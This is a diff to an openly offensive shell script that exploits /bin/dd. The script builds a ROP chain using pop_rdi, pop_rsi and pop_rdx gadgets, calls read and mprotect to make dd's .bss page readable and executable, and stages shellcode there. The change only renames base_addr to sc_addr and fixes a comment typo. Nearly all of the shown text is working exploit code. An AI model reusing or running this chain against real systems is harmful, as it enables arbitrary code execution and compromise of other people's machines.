@@ -1,6 +1,6 @@
 #!/bin/sh
 
-# A _very_ long filename may shift the stack too much which and oblige to lower
+# A _very_ long filename may shift the stack too much and oblige to lower
 # the `write_to_addr' variable.
 filename=/bin/dd
 # Position in the stack we start to overwrite. We are trying to overflow
@@ -220,20 +220,20 @@ craft_rop()
     rop=$rop$pop_rdi
     rop=$rop"0000000000000000"
     rop=$rop$pop_rsi
-    rop=$rop$base_addr
+    rop=$rop$sc_addr
     rop=$rop$pop_rdx
     rop=$rop$(endian $1)
     rop=$rop$read_addr
 
     rop=$rop$pop_rdi
-    rop=$rop$base_addr
+    rop=$rop$sc_addr
     rop=$rop$pop_rsi
     rop=$rop$map_size
     rop=$rop$pop_rdx
     rop=$rop"0500000000000000" # R X
     rop=$rop$mprotect_addr
 
-    rop=$rop$base_addr
+    rop=$rop$sc_addr
 
     local retsled=""
     for i in $(seq $(((4096 - ${#rop} / 2) / 8)))
@@ -307,9 +307,9 @@ else # System with musl
 fi
 
 # We will load the second stage (shellcode) in the .bss of dd
-base_addr=$(search_section file $filename .bss | cut -d' ' -f3)
-base_addr=$(((base_addr + 0x$dd_base) & (~0xfff)))
-base_addr=$(endian $(printf %016x $base_addr))
+sc_addr=$(search_section file $filename .bss | cut -d' ' -f3)
+sc_addr=$(((sc_addr + 0x$dd_base) & (~0xfff)))
+sc_addr=$(endian $(printf %016x $sc_addr))
 
 ## 1st payload: Craft the ROP
 rop=$(craft_rop $sc_len)
